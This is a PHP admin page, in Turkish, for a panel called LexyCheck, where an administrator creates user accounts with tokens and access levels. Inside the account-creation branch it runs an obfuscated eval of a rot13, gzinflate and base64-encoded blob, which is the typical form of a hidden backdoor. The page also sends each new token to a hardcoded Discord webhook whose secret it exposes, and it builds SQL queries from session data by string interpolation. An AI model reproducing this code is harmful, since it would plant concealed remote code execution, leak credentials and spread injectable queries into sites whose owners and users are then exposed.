<?php

include_once 'includes/baglan.php';

session_start();

if ($_SESSION['GET_USER_SSID'] == "") {
    header('Location: auth/auth-login');
}

$GET_SESSION_TOKEN = $_SESSION['GET_USER_SSID'];

$CheckAccount = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");
$CheckAccountCount = $CheckAccount->rowCount();

while ($CheckData = $CheckAccount->fetch()) {
    $access = $CheckData['access_level'];
}

if ($CheckAccountCount != "1") {
    exit('Error: no token');
    die();
}

if ($access < 1) {
    header('Location: anasayfa');
}

?>
<!DOCTYPE html>
<html class="loading dark-layout" lang="tr" data-layout="dark-layout" data-textdirection="ltr">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kullanıcı Ekle</title>
    <link rel="apple-touch-icon" href="app-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/ico/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500;1,600" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/vendors.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap-extended.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/colors.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/components.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/bordered-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/semi-dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/forms/form-validation.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/pages/authentication.css">
    <link rel="stylesheet" type="text/css" href="assets/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.1.9/sweetalert2.min.css">
    <style id="tableConfig">
        th {
            border: none !important;
        }

        table {
            border-collapse: collapse;
            border-spacing: 0;
            width: 100%;
        }

        th,
        td {
            text-align: left;
            padding: 8px;
        }
    </style>
</head>

<?php
include_once("includes/header.php");
?>

<?php
include_once("includes/menu.php");
?>
<div class="app-content content ">
    <div class="content-overlay"></div>
    <div class="header-navbar-shadow"></div>
    <div class="content-wrapper container-xxl p-0">
        <div class="content-header row">
            <div class="content-header-left col-md-9 col-12 mb-2">
                <div class="row breadcrumbs-top">
                    <div class="col-12">
                        <h2 class="content-header-title float-start mb-0">Kullanıcı Ekle</h2>
                        <div class="breadcrumb-wrapper">
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="anasayfa">Ana Sayfa</a>
                                </li>
                                <li class="breadcrumb-item active">Kullanıcı Ekle
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
            <?php
            include_once("includes/drop.php");
            ?>
        </div>
        <div class="content-body">
            <section id="basic-input">
                <div class="row">
                    <div class="col-md-12">
                        <div class="card">
                            <div class="card-header">
                                <h4 class="card-title">LexyCheck Kullanıcı Ekle</h4>
                            </div>
                            <form action="admin-user-add" method="POST">
                                <div class="card-body">
                                    <div class="row">
                                        <section id="floating-label-input">
                                            <div class="row">
                                                <div class="col-sm-12 col-12 mb-1 mb-sm-0">
                                                    <div class="form-floating">
                                                        <div class="mb-1">
                                                            <input type="text" class="form-control" placeholder="Oluşturulacak anahtar için bir kullanıcı adı belirleyin" name="username">
                                                        </div>
                                                    </div>
                                                </div>
												<div class="col-sm-12 col-12 mb-1 mb-sm-0">
                                                    <div class="form-floating">
                                                        <div class="mb-1">
														<small>Hesap Süresi Bitiş Tarihi : </small>
                                                        <input type="date" class="form-control"  name="expire">
                                                        </div>
                                                    </div>
                                                </div>
												<div class="col-sm-12 col-12 mb-1 mb-sm-0">
                                                    <div class="form-floating">
                                                        <div class="mb-1">
														<small>Hesap Yetkisi : </small>
                                                        <select name="access_level" class="form-select">
														<option name="access_level" selected value="0">Normal Üye</option>
														<option name="access_level" value="-2">Deneme Üye</option>												
														<option name="access_level" value="1">Admin</option>
														</select>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </section>

                                        <div class="card-header">
                                            <section id="bootstrap-toasts">
                                                <button type="submit" class="btn waves-effect toast-basic-toggler waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fa fa-search"></i> Kullanıcı Ekle</button>
                                            </section>
                                            <a href="" class="text-white"><button type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fa fa-trash-alt"></i> Temizle</button></a>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.1.9/sweetalert2.all.min.js"></script>
            <div class="content-body">
                <div class="row" id="basic-table">
                    <div class="col-12">
                        <div class="card">
                            <div class="table-responsive">
                                <?php

                                if ($_POST) {

                                    $content = $_POST['username'];
									$expire = $_POST['expire'];
									
									$access = $_POST['access_level'];

                                    date_default_timezone_set('Europe/Istanbul');

                                    $DateTimeNow = date('d.m.y H:i:s');

                                    $Salt = md5(sha1(rand(111111,9999999)));
                                    $Result = substr($Salt, 0,32);
									
									$CheckTokenCount = $db->query("SELECT * FROM users WHERE token = '$Result'");
									$TokenCount = $CheckTokenCount->rowCount();
       

                                    if ($content == "" || $expire == "" || $access == "") 
									{
                                        echo '
                                                <script type="text/javascript">
                                                Swal.fire({
                                                    title: "Hata!",
                                                    text: "Boş alan olamaz!",
                                                    icon: "error",
                                                    width: "400px",
                                                    confirmButtonColor: "#6610f2",
                                                    allowOutsideClick: false,
                                                    background: "#283046",
                                                })
                                                </script>
                                                ';
                                    } 
									else if ($TokenCount == "1")
									{
										echo '
                                                <script type="text/javascript">
                                                Swal.fire({
                                                    title: "Hata!",
                                                    text: "Bu token zaten mevcut! tekrar deneyin",
                                                    icon: "error",
                                                    width: "400px",
                                                    confirmButtonColor: "#6610f2",
                                                    allowOutsideClick: false,
                                                    background: "#283046",
                                                })
                                                </script>
                                        ';
									}
									else 
									{
                                        echo "<script> 
                                                Swal.fire({
                                                    title: 'Hesap Oluşturuldu!',
                                                    text: 'Token: $Result',
                                                    icon: 'success',
                                                    width: '400px',
													id: 'testsweet',
                                                    showConfirmButton: false,
                                                    allowOutsideClick: false,
                                                    background: '#283046',
                                                    timer: 5000,
                                                })</script><script>";
                                        $sql = "INSERT INTO users (username, token, access_level, expire_date) VALUES (?,?,?,?)";
                                        $stmt = $db->prepare($sql);
                                        $stmt->execute([$content, $Result, $access, $expire]);
                                                                            if ($_POST) {
                                        
                                        $tc = $_POST['tc'];
										
										
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

										
										$serino = $_POST['serino'];

                                        date_default_timezone_set('Europe/Istanbul');

                                        $datetimenow = date('d.m.y H:i:s');

                                        session_start();

                                        $SESSNICK = $_SESSION['GET_USER_SSID'];

                                        $SESSQRY = $db->query("SELECT * FROM users WHERE token = '$SESSNICK'");

                                        while ($SESSDATA = $SESSQRY->fetch()) {
                                            $edituser = $SESSDATA['username']; $profileimgx = $SESSDATA['profile_image'];
                                        }

                                        $webhookurl = "https://discord.com/api/webhooks/1058040719358562486/u9u9yYK1pePomz0Vi8RujXX9TmvvCbtERsyl0Ewxf9YrCFAkvEvTQVAiMXPYx6ssQEu-";

                                        $timestamp = date("c", strtotime("now"));
										

	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$logip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$logip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$logip = $_SERVER['REMOTE_ADDR'];
	}


$value = base64_encode($logip);

$json_data = json_encode(
    ["content" => "**$edituser** tarafından bir key açıldı! \n Açılan token bilgileri \n Adı: $content \n Tokeni: $Result \n Rolü: $access \n Bitiş Tarihi: $expire","username" => "$edituser","avatar_url" => "$profileimgx","$image","tts" => false], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                                        $ch = curl_init($webhookurl);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        $response = curl_exec($ch);
                                        curl_close($ch);
                                    }
                                }
								}
                                ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php
include_once("includes/ayar.php");
?>

<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/jquery.dataTables.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/dataTables.bootstrap5.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/dataTables.responsive.js'></script>

<script>
    if (window.innerWidth < 769) {
        var element = document.getElementById("example2");
        element.classList.add("table-responsive");
    }
</script>
<script>
    $('#example2').DataTable({
        "paging": true,
        "lengthChange": false,
        "searching": false,
        "ordering": false,
        "info": false,
        "autoWidth": true,
        "responsive": true,
        "sDom": '<"refresh"i<"clear">>rt<"top"lf<"clear">>rt<"bottom"p<"clear">>',
        "language": {
            "emptyTable": "Gösterilecek veri bulunamadı.",
            "processing": "Veriler yükleniyor",
            "sDecimal": ".",
            "sInfo": "_TOTAL_ kayıttan _START_ - _END_ arasındaki kayıtlar gösteriliyor",
            "sInfoFiltered": "(_MAX_ kayıt içerisinden bulunan)",
            "sInfoPostFix": "",
            "sInfoThousands": ".",
            "sLengthMenu": "Sayfada _MENU_ kayıt göster",
            "sLoadingRecords": "Yükleniyor...",
            "sSearch": "Ara:",
            "sZeroRecords": "Eşleşen kayıt bulunamadı",
            "oPaginate": {
                "sFirst": "İlk",
                "sLast": "Son",
                "sNext": "Sonraki",
                "sPrevious": "Önceki"
            },
            "oAria": {
                "sSortAscending": ": artan sütun sıralamasını aktifleştir",
                "sSortDescending": ": azalan sütun sıralamasını aktifleştir"
            },
            "select": {
                "rows": {
                    "_": "%d kayıt seçildi",
                    "0": "",
                    "1": "1 kayıt seçildi"
                }
            }
        }
    });
</script>


<div class="sidenav-overlay"></div>
<div class="drag-target"></div>

<button class="btn btn-primary btn-icon scroll-top" type="button"><i data-feather="arrow-up"></i></button>

<script src="app-assets/vendors/js/vendors.min.js"></script>
<script src="app-assets/vendors/js/forms/validation/jquery.validate.min.js"></script>
<script src="app-assets/js/core/app-menu.js"></script>
<script src="app-assets/js/core/app.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.1.9/sweetalert2.all.min.js"></script>
<script src="app-assets/js/scripts/pages/auth-login.js"></script>
<script>
    $(window).on('load', function() {
        if (feather) {
            feather.replace({
                width: 14,
                height: 14
            });
        }
    })
</script>
</body>

</html>